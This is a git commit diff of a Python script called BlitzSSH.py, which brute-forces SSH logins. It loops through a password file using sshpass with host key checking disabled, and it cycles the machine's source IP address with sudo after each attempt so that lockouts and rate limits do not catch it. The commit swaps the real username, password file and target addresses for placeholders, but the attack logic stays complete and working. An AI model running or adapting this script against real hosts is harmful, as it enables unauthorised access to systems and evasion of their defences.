667e0a4c03e4b196b75aa57e24db83c4b48a0782
WAntill <75125041+WAntill@users.noreply.github.com>
2023-03-10 13:28:17 +0000

    Update BlitzSSH.py

--- BlitzSSH.py
+++ BlitzSSH.py
@@ -3,12 +3,12 @@ import subprocess
 ips = []
 passwds = []
 outputlist = []
-users = ['webdev']  # list of users to try
+users = ['']  # list of users to try
 
 for i in range(52, 254):
     ips.append(i)
 
-with open('./aptpw.txt', 'r') as file1:
+with open('./passwordfile.txt', 'r') as file1:
     passwds = [line.strip() for line in file1]
 
 count = 0
@@ -19,11 +19,11 @@ while passwd_index < len(passwds):
     for user in users:
         for ps in passwds:
             print(user,':', ps)
-            subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + '30.30.0.50'])
+            subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + 'IP ADDR'])
             ip = ips[ip_index]
             old_ip = ip - 1
-            set_ip = subprocess.call(['sudo', 'ip', 'addr', 'add', '30.30.0.' + str(ip) + '/24', 'dev', 'enp0s8'])
-            rem_ip = subprocess.call(['sudo', 'ip', 'addr', 'delete', '30.30.0.' + str(old_ip) + '/24', 'dev', 'enp0s8'])
+            set_ip = subprocess.call(['sudo', 'ip', 'addr', 'add', 'IP ADDR' + str(ip) + '/24', 'dev', 'enp0s8'])
+            rem_ip = subprocess.call(['sudo', 'ip', 'addr', 'delete', 'IP ADDR' + str(old_ip) + '/24', 'dev', 'enp0s8'])
             ip_index += 1
             if ip_index >= len(ips):
                 ip_index = 0
